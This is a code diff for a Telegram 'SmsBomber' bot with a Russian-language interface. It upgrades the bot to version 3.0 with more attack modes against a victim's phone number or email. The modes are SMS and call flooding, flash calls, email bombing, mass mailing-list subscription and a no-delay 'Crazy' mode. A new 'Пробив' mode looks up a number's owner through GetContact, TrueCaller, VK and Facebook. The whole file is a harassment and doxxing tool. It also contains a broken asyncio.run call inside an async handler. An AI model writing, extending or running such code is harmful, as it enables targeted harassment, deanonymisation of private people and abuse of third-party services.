@@ -5,7 +5,7 @@ import asyncio
 import time
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
-from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, FSInputFile
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, FSInputFile
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -15,30 +15,39 @@ dp = Dispatcher()
 
 active_attacks = {}
 user_settings = {}
-user_filters = {}  # country filter per user
+user_filters = {}
 
-# Настройки по умолчанию
-def get_attack_type(user_id):
-    return user_settings.get(user_id, {}).get("type", "MIX")
+# --- Настройки ---
+def get_user_setting(uid, key, default=None):
+    if uid not in user_settings:
+        user_settings[uid] = {}
+    return user_settings[uid].get(key, default)
 
-def set_attack_type(user_id, atype):
-    if user_id not in user_settings:
-        user_settings[user_id] = {}
-    user_settings[user_id]["type"] = atype
+def set_user_setting(uid, key, value):
+    if uid not in user_settings:
+        user_settings[uid] = {}
+    user_settings[uid][key] = value
 
-def get_user_filter(user_id):
-    return user_filters.get(user_id, "ALL")
+def get_attack_type(uid):
+    return get_user_setting(uid, "type", "MIX")
 
-def set_user_filter(user_id, country):
-    user_filters[user_id] = country
+def set_attack_type(uid, atype):
+    set_user_setting(uid, "type", atype)
+
+def get_user_filter(uid):
+    return get_user_setting(uid, "filter", "ALL")
+
+def set_user_filter(uid, country):
+    set_user_setting(uid, "filter", country)
 
 # --- Клавиатуры ---
 def main_keyboard():
     kb = [
         [KeyboardButton(text="💣 Атака"), KeyboardButton(text="⏹ Стоп")],
         [KeyboardButton(text="📱 SMS"), KeyboardButton(text="📞 Звонки"), KeyboardButton(text="🔀 MIX")],
-        [KeyboardButton(text="📊 Статистика"), KeyboardButton(text="🔧 Фильтр"), KeyboardButton(text="📤 Экспорт")],
-        [KeyboardButton(text="📖 Помощь"), KeyboardButton(text="ℹ️ О проекте")],
+        [KeyboardButton(text="⚡ FlashCall"), KeyboardButton(text="📧 EmailBomb"), KeyboardButton(text="🔇 Тишина")],
+        [KeyboardButton(text="🔥 Crazy"), KeyboardButton(text="🔍 Пробив"), KeyboardButton(text="📊 Статистика")],
+        [KeyboardButton(text="🔧 Фильтр"), KeyboardButton(text="📤 Экспорт"), KeyboardButton(text="📖 Помощь")],
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
@@ -50,39 +59,49 @@ def filter_keyboard():
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
+# Описания режимов
+MODE_DESC = {
+    "SMS": "📱 **SMS** — спам-регистрации на сайтах, SMS-коды",
+    "CALL": "📞 **Звонки** — запросы обратного звонка",
+    "MIX": "🔀 **MIX** — SMS + Звонки одновременно",
+    "FLASHCALL": "⚡ **FlashCall** — прозвон (звонок и сброс)",
+    "EMAIL": "📧 **EmailBomb** — регистрации на сайтах по email",
+    "SUBSCRIBE": "🔇 **Тишина** — подписка номера на рассылки",
+    "CRAZY": "🔥 **Crazy** — макс. скорость, все сервисы без задержек",
+    "LOOKUP": "🔍 **Пробив** — поиск номера по базам (имя, соцсети)",
+}
+
 # --- Команды ---
 @dp.message(Command("start"))
 async def start_command(message: types.Message):
     uid = message.from_user.id
     atype = get_attack_type(uid)
     await message.answer(
-        f"💣 **Grobovsheke-SmsBomber v2.0**\n\n"
-        f"⚙️ Текущий тип: **{atype}**\n"
-        f"🌍 Фильтр: **{get_user_filter(uid)}**\n\n"
-        "Используй кнопки ниже 👇",
+        f"💣 **Grobovsheke-SmsBomber v3.0**\n\n"
+        f"**8 режимов атаки:**\n" + "\n".join(MODE_DESC.values()) + "\n\n"
+        f"⚙️ Текущий: **{atype}**\n"
+        f"🌍 Фильтр: **{get_user_filter(uid)}**",
         reply_markup=main_keyboard()
     )
 
 @dp.message(Command("help"))
 async def help_command(message: types.Message):
     uid = message.from_user.id
-    atype = get_attack_type(uid)
     await message.answer(
-        f"📖 **Справка**\n\n"
-        f"**Запуск атаки:**\n"
-        f"`79123456789 5` — один номер на 5 мин\n"
-        f"`+79123456789,+79876543210 3` — несколько номеров\n\n"
-        f"**Режимы:**\n"
-        f"📱 SMS — только сообщения\n"
-        f"📞 Звонки — только звонки\n"
-        f"🔀 MIX — всё сразу\n\n"
-        f"**Фильтры:**\n"
-        f"🌍 Все страны / 🇷🇺 Россия / 🇺🇿 Узбекистан / 🇺🇦 Украина\n\n"
-        f"**Команды:**\n"
-        f"📊 Статистика — состояние сервисов\n"
-        f"📤 Экспорт — выгрузить список сервисов\n"
-        f"/stop — остановить атаку\n\n"
-        f"⚙️ Текущий: **{atype}** | Фильтр: **{get_user_filter(uid)}**"
+        "📖 **Справка**\n\n"
+        "**Запуск атаки:**\n"
+        "`79123456789 5` — 1 номер на 5 мин\n"
+        "`+79123456789,+79876543210 3` — несколько\n\n"
+        "**Режимы:**\n"
+        + "\n".join(MODE_DESC.values()) + "\n\n"
+        "**EmailBomb:** `email@mail.com 5` — атака почты\n"
+        "**Пробив:** `79123456789` — разовый поиск\n\n"
+        "**Команды:**\n"
+        "📊 Статистика — состояние сервисов\n"
+        "📤 Экспорт — выгрузить список сервисов\n"
+        "🔧 Фильтр — по стране\n"
+        "/stats /reset /stop",
+        reply_markup=main_keyboard()
     )
 
 @dp.message(Command("stats"))
@@ -91,7 +110,7 @@ async def stats_command(message: types.Message):
     text = get_summary_text()
     dead = list_dead_services()
     if dead:
-        text += "\n💀 **Мёртвые сервисы:**\n" + "\n".join(dead[:10])
+        text += f"\n💀 **Мёртвые ({len(dead)}):**\n" + "\n".join(dead[:10])
     await message.answer(text, reply_markup=main_keyboard())
 
 @dp.message(Command("reset"))
@@ -100,18 +119,6 @@ async def reset_command(message: types.Message):
     reset_stats()
     enable_all()
     await message.answer("✅ Статистика сброшена, все сервисы включены")
-
-@dp.message(Command("attack"))
-async def attack_command(message: types.Message):
-    args = message.text.split()
-    if len(args) < 3:
-        await message.answer(
-            "❌ Введи номер(а) и время.\n"
-            "Пример: `/attack 79123456789 5`\n"
-            "Или несколько: `/attack +79123456789,+79876543210 3`"
-        )
-        return
-    await run_attack(message, args[1], args[2])
 
 @dp.message(Command("stop"))
 async def stop_command(message: types.Message):
@@ -127,36 +134,58 @@ async def stop_command(message: types.Message):
     else:
         await message.answer("❌ Нет активных атак.", reply_markup=main_keyboard())
 
-# --- Основная атака ---
-async def run_attack(message: types.Message, numbers_str: str, minutes: str):
+# --- Атака ---
+async def run_attack(message: types.Message, numbers_str: str, minutes: str, 
+                     attack_type=None, email=None):
     user_id = message.from_user.id
     chat_id = message.chat.id
     
-    if not minutes.isdigit():
-        await message.answer("❌ Время должно быть числом!")
-        return
-    mins = int(minutes)
-    if mins < 1 or mins > 10:
-        await message.answer("❌ Время от 1 до 10 минут!")
+    if attack_type is None:
+        attack_type = get_attack_type(user_id)
+
+    if attack_type == "LOOKUP":
+        # Разовый поиск — без таймера
+        await message.answer("🔍 **Поиск запущен...**", reply_markup=main_keyboard())
+        from Core.Run import async_attacks
+        numbers = [n.replace('+', '') for n in re.findall(r'\+?\d+', numbers_str)]
+        if not numbers:
+            await message.answer("❌ Некорректный номер!")
+            return
+        result = asyncio.run(async_attacks(numbers, "LOOKUP", get_user_filter(user_id), email))
+        await message.answer(
+            f"🔍 **Поиск завершён**\n\n"
+            f"📱 Номер: `{numbers[0]}`\n"
+            f"🔍 Запросов: {result.get('total', 0)}\n"
+            f"✅ Найдено: {result.get('success', 0)}\n"
+            f"❌ Ошибок: {result.get('fail', 0)}",
+            reply_markup=main_keyboard()
+        )
         return
 
-    # Парсим номера
-    numbers = re.findall(r'\+?\d+', numbers_str)
+    if attack_type == "EMAIL":
+        email = numbers_str
+        numbers = ["0000000000"]
+        if not email or '@' not in email:
+            await message.answer("❌ Введи email! Пример: `test@mail.ru 3`")
+            return
+    else:
+        if not minutes.isdigit():
+            await message.answer("❌ Время должно быть числом!")
+            return
+        mins = int(minutes)
+        if mins < 1 or mins > 10:
+            await message.answer("❌ Время от 1 до 10 минут!")
+            return
+        # Парсим номера
+        numbers = []
+        for n in re.findall(r'\+?\d+', numbers_str):
+            n = n.replace('+', '')
+            if len(n) >= 10 and n.isdigit():
+                numbers.append(n)
+
     if not numbers:
-        await message.answer("❌ Некорректный номер!")
+        await message.answer("❌ Некорректные данные!")
         return
-    
-    cleaned = []
-    for n in numbers:
-        n = n.replace('+', '')
-        if len(n) >= 10 and n.isdigit():
-            cleaned.append(n)
-    
-    if not cleaned:
-        await message.answer("❌ Номера должны быть цифрами (минимум 10 цифр)!")
-        return
-
-    attack_type = get_attack_type(user_id)
 
     # Останавливаем предыдущую атаку
     if user_id in active_attacks and active_attacks[user_id]["status"] == "running":
@@ -171,15 +200,12 @@ async def run_attack(message: types.Message, numbers_str: str, minutes: str):
 
     attack_id = int(time.time() * 1000)
     active_attacks[user_id] = {
-        "number": "+" + " +".join(cleaned),
-        "minutes": minutes,
-        "status": "running",
+        "numbers": numbers,
         "type": attack_type,
+        "status": "running",
         "id": attack_id,
-        "numbers": cleaned,
     }
 
-    # Callback для прогресса
     async def send_progress(text):
         try:
             await bot.send_message(chat_id, f"📊 **Прогресс:**\n{text}", parse_mode="Markdown")
@@ -198,11 +224,12 @@ async def run_attack(message: types.Message, numbers_str: str, minutes: str):
     def run(aid, nums):
         try:
             start_async_attacks(
-                nums, minutes,
+                nums, minutes if minutes.isdigit() else "3",
                 attack_type=attack_type,
                 stop_previous=True,
                 progress_callback=progress_wrapper,
                 country_filter=get_user_filter(user_id),
+                email=email,
             )
             current = active_attacks.get(user_id, {})
             if current.get("id") != aid:
@@ -211,12 +238,12 @@ async def run_attack(message: types.Message, numbers_str: str, minutes: str):
                 return
             active_attacks[user_id]["status"] = "completed"
             
-            # Итоговая статистика
             from Core.Attack.ServiceRegistry import get_summary_text
-            final = f"✅ **Атака завершена!**\n\n"
-            final += f"📱 Номера: `{' +'.join(nums)}`\n"
+            final = f"✅ **{attack_type} завершён!**\n\n"
+            if attack_type != "EMAIL":
+                final += f"📱 Номера: `{' +'.join(nums)}`\n"
             final += f"⏱ Длительность: {minutes} мин.\n"
-            final += f"🔀 Тип: {attack_type}\n\n"
+            final += f"MODE: {MODE_DESC.get(attack_type, attack_type)}\n\n"
             final += get_summary_text()
             
             loop = asyncio.new_event_loop()
@@ -230,123 +257,156 @@ async def run_attack(message: types.Message, numbers_str: str, minutes: str):
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             loop.run_until_complete(bot.send_message(
-                chat_id,
-                f"❌ **Ошибка:**\n`{e}`",
-                parse_mode="Markdown"
-            ))
+                chat_id, f"❌ **Ошибка:**\n`{e}`", parse_mode="Markdown"))
             loop.close()
 
-    Thread(target=run, args=(attack_id, cleaned), daemon=True).start()
+    Thread(target=run, args=(attack_id, numbers), daemon=True).start()
 
-    targets = " +".join(cleaned)
+    targets = " +".join(numbers) if attack_type != "EMAIL" else email
     await message.answer(
-        f"✅ **Атака запущена!**\n"
-        f"📱 Номера: `{targets}`\n"
+        f"✅ **{attack_type} запущен!**\n"
+        f"🎯 Цель: `{targets}`\n"
         f"⏱ Длительность: {minutes} мин.\n"
-        f"🔀 Тип: {attack_type}\n"
-        f"💣 Сообщения идут непрерывно...",
+        f"MODE: {MODE_DESC.get(attack_type, attack_type)}",
         reply_markup=main_keyboard()
     )
 
-# --- Обработка текста ---
+# --- Обработка кнопок ---
 @dp.message()
 async def handle_text(message: types.Message):
     text = message.text.strip()
     uid = message.from_user.id
     
     if text == "💣 Атака":
+        atype = get_attack_type(uid)
         await message.answer(
-            "Введи номер(а) и время атаки:\n\n"
-            "Один номер: `79123456789 5`\n"
-            "Несколько: `+79123456789,+79876543210 3`\n\n"
-            f"⚙️ Текущий тип: **{get_attack_type(uid)}**\n"
-            f"🌍 Фильтр: **{get_user_filter(uid)}**"
+            "Введи цель и время атаки:\n\n"
+            f"▪️ Номер: `79123456789 5`\n"
+            f"▪️ Несколько: `+79123456789,+79876543210 3`\n"
+            f"▪️ Email (в EmailBomb): `test@mail.ru 5`\n\n"
+            f"⚙️ Текущий режим: **{atype}**\n"
+            f"🌍 Фильтр: **{get_user_filter(uid)}**\n\n"
+            f"{MODE_DESC.get(atype, '')}"
         )
+    
     elif text in ("📱 SMS", "📞 Звонки", "🔀 MIX"):
         type_map = {"📱 SMS": "SMS", "📞 Звонки": "CALL", "🔀 MIX": "MIX"}
         atype = type_map[text]
         set_attack_type(uid, atype)
-        await message.answer(f"✅ Тип атаки изменён на **{atype}**", reply_markup=main_keyboard())
+        await message.answer(f"✅ Режим изменён на **{atype}**", reply_markup=main_keyboard())
+    
+    elif text == "⚡ FlashCall":
+        set_attack_type(uid, "FLASHCALL")
+        await message.answer(
+            "⚡ **FlashCall** — выбран!\n\n"
+            "Введи номер и время: `79123456789 3`\n"
+            "📞 Будет прозвон (flash call) — звонок и сброс",
+            reply_markup=main_keyboard()
+        )
+    
+    elif text == "📧 EmailBomb":
+        set_attack_type(uid, "EMAIL")
+        await message.answer(
+            "📧 **EmailBomb** — выбран!\n\n"
+            "Введи email и время: `target@mail.ru 3`\n"
+            "📨 Письма на почту от разных сервисов",
+            reply_markup=main_keyboard()
+        )
+    
+    elif text == "🔇 Тишина":
+        set_attack_type(uid, "SUBSCRIBE")
+        await message.answer(
+            "🔇 **Тишина** — выбран!\n\n"
+            "Введи номер и время: `79123456789 3`\n"
+            "📬 Подписка на все рассылки и SMS-уведомления",
+            reply_markup=main_keyboard()
+        )
+    
+    elif text == "🔥 Crazy":
+        set_attack_type(uid, "CRAZY")
+        await message.answer(
+            "🔥 **Crazy** — выбран!\n\n"
+            "Введи номер и время: `79123456789 3`\n"
+            "💣 Максимальная скорость! SMS + Звонки + FlashCall без задержек",
+            reply_markup=main_keyboard()
+        )
+    
+    elif text == "🔍 Пробив":
+        set_attack_type(uid, "LOOKUP")
+        await message.answer(
+            "🔍 **Пробив** — выбран!\n\n"
+            "Просто введи номер: `79123456789`\n"
+            "🔎 Поиск по базам: GetContact, TrueCaller, VK, Facebook",
+            reply_markup=main_keyboard()
+        )
     
     elif text == "📊 Статистика":
         await stats_command(message)
     
     elif text == "🔧 Фильтр":
         await message.answer(
-            "🌍 **Выбери страну для фильтрации сервисов:**\n\n"
-            f"Текущий фильтр: **{get_user_filter(uid)}**",
-            reply_markup=filter_keyboard()
-        )
+            "🌍 **Выбери страну:**", reply_markup=filter_keyboard())
     
     elif text in ("🌍 Все страны", "🇷🇺 Россия", "🇺🇿 Узбекистан", "🇺🇦 Украина"):
-        filter_map = {
-            "🌍 Все страны": "ALL",
-            "🇷🇺 Россия": "RU",
-            "🇺🇿 Узбекистан": "UZ",
-            "🇺🇦 Украина": "UA",
-        }
+        filter_map = {"🌍 Все страны": "ALL", "🇷🇺 Россия": "RU", "🇺🇿 Узбекистан": "UZ", "🇺🇦 Украина": "UA"}
         country = filter_map[text]
         set_user_filter(uid, country)
-        await message.answer(f"✅ Фильтр изменён на **{country}**", reply_markup=main_keyboard())
+        await message.answer(f"✅ Фильтр: **{country}**", reply_markup=main_keyboard())
     
     elif text == "📤 Экспорт":
         from Core.Attack.Services import urls
         from Core.Attack.Services_Extra import extra_urls
-        all_svc = urls('00000000000') + extra_urls('00000000000')
-        
-        # Сохраняем в JSON
-        export = []
-        for s in all_svc:
-            export.append({
-                "website": s['info']['website'],
-                "attack": s['info']['attack'],
-                "country": s['info']['country'],
-                "method": s.get('method', 'post'),
-                "url": s['url'],
-            })
-        
+        all_svc = urls('0000000000') + extra_urls('0000000000')
+        export = [{"website": s['info']['website'], "attack": s['info']['attack'], 
+                   "country": s['info']['country'], "url": s['url']} for s in all_svc]
         with open('/tmp/services_export.json', 'w') as f:
             json.dump(export, f, indent=2, ensure_ascii=False)
-        
         await message.answer(
-            f"📤 **Экспорт сервисов**\n\n"
-            f"Всего: {len(export)} сервисов\n"
-            f"SMS: {sum(1 for s in export if s['attack']=='SMS')}\n"
-            f"CALL: {sum(1 for s in export if s['attack']=='CALL')}",
-            reply_markup=main_keyboard()
-        )
+            f"📤 Всего: {len(export)} сервисов", reply_markup=main_keyboard())
         try:
             await message.answer_document(FSInputFile('/tmp/services_export.json'))
         except:
-            await message.answer("Файл экспорта готов: `/tmp/services_export.json`")
+            pass
     
     elif text == "◀️ Назад":
         await start_command(message)
-    
     elif text == "⏹ Стоп":
         await stop_command(message)
     elif text == "📖 Помощь":
         await help_command(message)
-    elif text == "ℹ️ О проекте":
+    elif text in ("ℹ️ О проекте",):
         await start_command(message)
+    
     else:
-        # Проверяем, не ввёл ли пользователь номер(а) и время
+        # Парсим ввод пользователя
         parts = text.split()
-        if len(parts) == 2 and parts[1].isdigit():
+        attack_type = get_attack_type(uid)
+        
+        if attack_type == "LOOKUP" and len(parts) == 1:
+            # Пробив — достаточно номера
             nums = re.findall(r'\+?\d+', parts[0])
             if nums:
-                await run_attack(message, parts[0], parts[1])
-            else:
-                await message.answer(
-                    "Используй кнопки ниже 👇",
-                    reply_markup=main_keyboard()
-                )
-        else:
-            await message.answer(
-                "Используй кнопки ниже 👇\n"
-                "Или введи `/attack <номер> <минуты>`",
-                reply_markup=main_keyboard()
-            )
+                await run_attack(message, parts[0], "0", attack_type="LOOKUP")
+                return
+        
+        if attack_type == "EMAIL" and len(parts) >= 1:
+            if '@' in parts[0]:
+                email = parts[0]
+                minutes = parts[1] if len(parts) > 1 and parts[1].isdigit() else "3"
+                await run_attack(message, email, minutes, attack_type="EMAIL")
+                return
+        
+        if len(parts) >= 2:
+            minutes = parts[-1]
+            target = " ".join(parts[:-1])
+            if minutes.isdigit() and 1 <= int(minutes) <= 10:
+                nums = re.findall(r'\+?\d+', target)
+                if nums or '@' in target:
+                    await run_attack(message, target, minutes)
+                    return
+        
+        await message.answer(
+            "Используй кнопки ниже 👇", reply_markup=main_keyboard())
 
 async def start_telegram_bot():
     await dp.start_polling(bot, handle_signals=False)
